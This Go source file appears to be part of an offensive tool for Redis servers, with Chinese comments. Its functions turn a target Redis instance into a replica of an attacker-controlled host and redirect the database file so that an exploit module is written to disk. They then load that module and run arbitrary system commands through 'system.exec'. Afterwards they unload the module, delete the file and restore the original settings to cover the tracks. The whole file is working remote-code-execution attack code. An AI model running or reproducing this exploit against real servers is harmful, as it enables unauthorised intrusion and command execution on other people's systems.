package pkg

import (
	"context"
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/axgle/mahonia"
)

var (
	payload []byte
)

// RunCmd system.exec 执行命令
func RunCmd(cmd string) {
	ctx := context.Background()
	val, err := Rdb.Do(ctx, "system.exec", cmd).Result()
	if err != nil {
		Err(err)
		return
	}
	fmt.Println(mahonia.NewDecoder("gbk").ConvertString(val.(string)))

}

// RedisSlave 开启主从复制
func RedisSlave() {
	// 打开 exp
	f, err := os.Open(dll)
	if err != nil {
		Err(err)
	}

	payload, err = io.ReadAll(f)
	if err != nil {
		Err(err)
	}

	Info("保存数据")
	Success(RedisCmd("save"))

	Info("导出数据 out.json")
	handle_export()

	Info("开启主从复制")
	slave := fmt.Sprintf("slaveof %v %v", Lhost, Lport)
	Info(slave)
	Success(RedisCmd(slave))

	dir := fmt.Sprintf("config set dir %v", redisDir)
	Info(dir)
	Success(RedisCmd(dir))

	file := fmt.Sprintf("config set dbfilename %v", dll)
	Info(file)
	Success(RedisCmd(file))

	Listen()

	load := fmt.Sprintf("module load ./%v", dll)
	Info(load)
	Success(RedisCmd(load))

}

// CloseSlave 关闭主从复制
func CloseSlave(s string) {
	Info("尝试关闭主从")

	Info("slaveof no one")
	Success(RedisCmd("slaveof no one"))

	// 执行命令才卸载 module
	if strings.Contains(s, "exec") {
		// 如果不是 exp.dll 就删除
		if !strings.Contains(dll, ".dll") {
			RunCmd("rm " + dll)
		}

		Info("module unload system")
		Success(RedisCmd("module unload system"))
	}

	dir := fmt.Sprintf("config set dir %v", redisDir)
	Info(dir)
	Success(RedisCmd(dir))

	db := fmt.Sprintf("config set dbfilename %v", redisDbFilename)
	Info(db)
	Success(RedisCmd(db))

	Info("导入数据 out.json")
	handle_import()
}
